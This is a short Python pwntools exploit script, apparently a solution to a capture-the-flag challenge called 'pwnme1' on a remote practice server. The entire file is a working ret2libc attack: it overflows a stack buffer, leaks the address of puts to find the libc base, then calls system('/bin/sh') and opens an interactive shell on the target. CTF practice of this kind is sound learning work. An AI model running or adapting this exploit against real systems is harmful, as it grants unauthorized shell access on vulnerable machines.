from pwn import *
r = remote('node3.buuoj.cn',28450)
elf = ELF('./pwnme1')
libc = ELF('./libc-2.23.so')

r.sendline('5')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = 'a'*0xa8+p32(puts_plt)+p32(0x80486f4)+p32(puts_got)
r.sendline(payload)
r.recvuntil('...\n')
leak = u32(r.recv(4))
libc_base = leak-libc.sym['puts']
log.success(hex(libc_base))
system = libc_base+libc.sym['system']
binsh = libc_base+libc.search('/bin/sh\x00').next()
r.sendline('5')
payload = 'a'*0xa8+p32(system)+p32(0x80486f4)+p32(binsh)
r.sendline(payload)
r.interactive()